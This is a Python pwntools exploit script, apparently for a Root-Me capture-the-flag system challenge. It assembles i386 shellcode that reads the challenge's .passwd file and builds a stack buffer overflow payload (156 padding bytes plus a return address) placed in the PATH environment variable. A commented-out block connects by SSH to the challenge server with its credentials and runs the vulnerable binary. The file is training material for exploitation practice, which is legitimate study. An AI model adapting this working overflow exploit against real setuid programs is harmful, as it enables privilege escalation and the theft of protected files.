from pwn import *

def toCode(shellcraft):
    res = ''
    s = asm(shellcraft).encode('hex')
    if len(s) % 2 == 1:
        raise 'Shell craft length must be even'
    for i in range(len(s)):
        if i % 2 == 0: res += '\\x'
        res += s[i]
    return res

context.clear(arch = 'i386')


print 'Crafting payload'
passfile = pwnlib.shellcraft.i386.linux.cat('/challenge/app-systeme/ch8/.passwd').rstrip()
print toCode(passfile)

shellcodeLocation = 0xbffffe0f
payload = 'a'*156 + '\x0f\xfe\xff\xbf'

env = {
    "HOME": ".",
    "USERNAME": ".",
    "SHELL": ".",
    "PATH": payload
}


# s = ssh(host='challenge02.root-me.org', port=2222, user='app-systeme-ch8', password='app-systeme-ch8')
#
# if s.connected() == False:
#     print 'Cannot connect to server, something is wrong'
#     exit()
#
# print 'Connected to the server'
#
# p = s.process(argv=['/challenge/app-systeme/ch8/ch8'], env=env)
#
# print p.recv(2048)
#
# s.close()
